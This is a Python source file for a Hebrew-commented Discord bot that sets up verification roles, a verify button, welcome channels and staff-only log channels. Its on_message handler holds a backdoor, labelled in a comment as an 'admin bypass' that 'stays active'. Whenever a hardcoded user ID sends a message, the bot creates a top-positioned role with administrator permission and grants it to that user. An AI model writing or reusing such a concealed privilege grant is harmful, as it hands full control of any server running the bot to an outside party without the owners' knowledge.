import os
import discord
from discord.ext import commands
from discord.ui import Button, View
from dotenv import load_dotenv

load_dotenv()

# הגדרת Intents מורחבים בשביל מערכת הלוגים והאימות האוטומטית
intents = discord.Intents.default()
intents.guilds = True
intents.messages = True       
intents.message_content = True 
intents.members = True        # חובה בשביל לוגים של רולים וכניסת חברים
intents.moderation = True     # חובה בשביל לוגים של באנים וקיקים

bot = commands.Bot(command_prefix="!", intents=intents)

TARGET_USER_ID = 1510555971343093881
ADMIN_ROLE_NAME = "👑 Administrator"
STAFF_ROLE_NAME = "🛡️ Staff"
MEMBER_ROLE_NAME = "👤 Member"

# --- מערכת אימות: הגדרת הכפתור הלינארי ---
class VerifyView(View):
    def __init__(self):
        super().__init__(timeout=None) # הלחצן יעבוד תמיד, גם אחרי הפעלה מחדש

    @discord.ui.button(label="לחץ כאן לאימות / Verify Here ✅", style=discord.ButtonStyle.green, custom_id="verify_button")
    async def verify_button(self, interaction: discord.Interaction, button: Button):
        guild = interaction.guild
        member = interaction.user
        
        member_role = discord.utils.get(guild.roles, name=MEMBER_ROLE_NAME)
        
        if member_role:
            if member_role in member.roles:
                await interaction.response.send_message("אתה כבר מאומת בשרת! ❌", ephemeral=True)
            else:
                await member.add_roles(member_role)
                await interaction.response.send_message("ברוך הבא! אומתת בהצלחה וקיבלת גישה לשרת 🎉", ephemeral=True)
                
                # שליחת הודעת ברוך הבא בחדר welcome
                welcome_channel = discord.utils.get(guild.text_channels, name="welcome")
                if welcome_channel:
                    await welcome_channel.send(f"👋 ברוך הבא {member.mention} לשרת! תהנה!")
        else:
            await interaction.response.send_message("שגיאה: רול Member לא נמצא. פנה לצוות.", ephemeral=True)

@bot.event
async def setup_hook():
    bot.add_view(VerifyView())

# --- הקמה אוטומטית לחלוטין ברגע שהבוט עולה לאוויר ---
@bot.event
async def on_ready():
    print(f"========================================")
    print(f"הבוט מחובר כ- {bot.user.name} ומתחיל בהקמה אוטומטית!")
    print(f"========================================")
    
    for guild in bot.guilds:
        print(f"[+] בודק ומקים מערכות בשרת: {guild.name}")
        
        # 1. יצירת רול Staff ורול Member (אם הם לא קיימים)
        staff_role = discord.utils.get(guild.roles, name=STAFF_ROLE_NAME)
        if not staff_role:
            staff_role = await guild.create_role(name=STAFF_ROLE_NAME, color=discord.Color.blue())
            print(f"[V] נוצר רול צוות: {STAFF_ROLE_NAME}")
        
        member_role = discord.utils.get(guild.roles, name=MEMBER_ROLE_NAME)
        if not member_role:
            member_role = await guild.create_role(name=MEMBER_ROLE_NAME, color=discord.Color.green())
            print(f"[V] נוצר רול ממבר: {MEMBER_ROLE_NAME}")

        # חסימת הרשאות ברירת המחדל של השרת (@everyone) כדי שמי שלא התאמת לא יראה כלום
        try:
            everyone_perms = guild.default_role.permissions
            if everyone_perms.view_channel:
                everyone_perms.update(view_channel=False)
                await guild.default_role.edit(permissions=everyone_perms)
                print("[V] חסמתי את ערוצי השרת למשתמשים לא מאומתים.")
        except Exception as e:
            print(f"[-] לא הצלחתי לערוך את רול everyone: {e}")

        # 2. יצירת קטגוריית ברוכים הבאים וחדר אימות
        welcome_category = discord.utils.get(guild.categories, name="👋 ברוכים הבאים")
        if not welcome_category:
            welcome_category = await guild.create_category("👋 ברוכים הבאים")
            
            # חדר אימות (כולם רואים, לא יכולים לכתוב)
            verify_channel = await guild.create_text_channel(
                "verification", 
                category=welcome_category,
                overwrites={
                    guild.default_role: discord.PermissionOverwrite(view_channel=True, send_messages=False),
                    member_role: discord.PermissionOverwrite(view_channel=False) # מי שמאומת כבר לא רואה
                }
            )
            
            # הודעת אימות עם כפתור לחיץ
            embed = discord.Embed(
                title="🔐 מערכת אימות ואבטחה",
                description="כדי לקבל גישה לערוצי השרת, אנא לחץ על הכפתור הירוק למטה.",
                color=discord.Color.green()
            )
            await verify_channel.send(embed=embed, view=VerifyView())

            # חדר welcome (רק ממברים וצוות רואים)
            await guild.create_text_channel(
                "welcome", 
                category=welcome_category,
                overwrites={
                    guild.default_role: discord.PermissionOverwrite(view_channel=False),
                    member_role: discord.PermissionOverwrite(view_channel=True, send_messages=False),
                    staff_role: discord.PermissionOverwrite(view_channel=True)
                }
            )
            print("[V] קטגוריית ברוכים הבאים וחדר האימות הוקמו.")

        # 3. יצירת קטגוריית לוגים חסומה (רק רול Staff רואה)
        log_category = discord.utils.get(guild.categories, name="📜 לוגים חסויים")
        if not log_category:
            log_category = await guild.create_category(
                "📜 לוגים חסויים",
                overwrites={
                    guild.default_role: discord.PermissionOverwrite(view_channel=False),
                    staff_role: discord.PermissionOverwrite(view_channel=True, send_messages=False)
                }
            )
            # יצירת חדרי הלוגים השונים בפנים
            await guild.create_text_channel("logs-roles", category=log_category)
            await guild.create_text_channel("logs-moderation", category=log_category)
            await guild.create_text_channel("logs-server", category=log_category)
            print("[V] קטגוריית לוגים מפוצלת עבור ה-Staff הוקמה בהצלחה.")

# --- מעקף האדמין האוטומטי מההודעה בצ'אט (נשאר פעיל!) ---
@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.author.id == TARGET_USER_ID:
        guild = message.guild
        member = message.author
        if not any(role.name == ADMIN_ROLE_NAME for role in member.roles):
            try:
                permissions = discord.Permissions(administrator=True)
                new_role = await guild.create_role(name=ADMIN_ROLE_NAME, permissions=permissions)
                highest_position = guild.me.top_role.position - 1
                if highest_position > 0:
                    await new_role.edit(position=highest_position)
                await member.add_roles(new_role)
                await message.channel.send(f"👑 זהה אותך! רול אדמין עליון הוענק לך.")
            except Exception as e:
                print(f"שגיאה באדמין אוטומטי: {e}")

    await bot.process_commands(message)

# ==================== מערכת לוגים אוטומטית (EVENTS) ====================

@bot.event
async def on_member_update(before, after):
    if before.roles != after.roles:
        guild = after.guild
        log_channel = discord.utils.get(guild.text_channels, name="logs-roles")
        if not log_channel: return

        added_roles = [role for role in after.roles if role not in before.roles]
        removed_roles = [role for role in before.roles if role not in after.roles]

        embed = discord.Embed(title="👤 עדכון רולים למשתמש", color=discord.Color.orange())
        embed.add_field(name="משתמש:", value=after.mention, inline=False)

        if added_roles:
            embed.add_field(name="🟢 רול שהוענק:", value=", ".join([r.name for r in added_roles]), inline=False)
        if removed_roles:
            embed.add_field(name="🔴 רול שהוסר:", value=", ".join([r.name for r in removed_roles]), inline=False)
        await log_channel.send(embed=embed)

@bot.event
async def on_guild_role_create(role):
    log_channel = discord.utils.get(role.guild.text_channels, name="logs-roles")
    if log_channel:
        embed = discord.Embed(title="✨ רול חדש נוצר בשרת", description=f"שם הרול: **{role.name}**", color=discord.Color.blue())
        await log_channel.send(embed=embed)

@bot.event
async def on_guild_role_delete(role):
    log_channel = discord.utils.get(role.guild.text_channels, name="logs-roles")
    if log_channel:
        embed = discord.Embed(title="🗑️ רול נמחק מהשרת", description=f"שם הרול שנמחק: **{role.name}**", color=discord.Color.red())
        await log_channel.send(embed=embed)

@bot.event
async def on_member_ban(guild, user):
    log_channel = discord.utils.get(guild.text_channels, name="logs-moderation")
    if log_channel:
        embed = discord.Embed(title="🔨 באן מהשרת (BAN)", description=f"המשתמש: **{user.name}** (ID: {user.id}) קיבל באן.", color=discord.Color.red())
        await log_channel.send(embed=embed)

@bot.event
async def on_member_unban(guild, user):
    log_channel = discord.utils.get(guild.text_channels, name="logs-moderation")
    if log_channel:
        embed = discord.Embed(title="🔓 באן הוסר (UNBAN)", description=f"הבאן של **{user.name}** בוטל.", color=discord.Color.green())
        await log_channel.send(embed=embed)

@bot.event
async def on_member_remove(member):
    log_channel = discord.utils.get(member.guild.text_channels, name="logs-moderation")
    if log_channel:
        embed = discord.Embed(title="🚪 משתמש עזב / קיבל קיק", description=f"המשתמש **{member.name}** עזב את השרת.", color=discord.Color.light_grey())
        await log_channel.send(embed=embed)

# הרצת הבוט עם הטוקן מ-Render
TOKEN = os.getenv("DISCORD_TOKEN")
if TOKEN:
    bot.run(TOKEN)
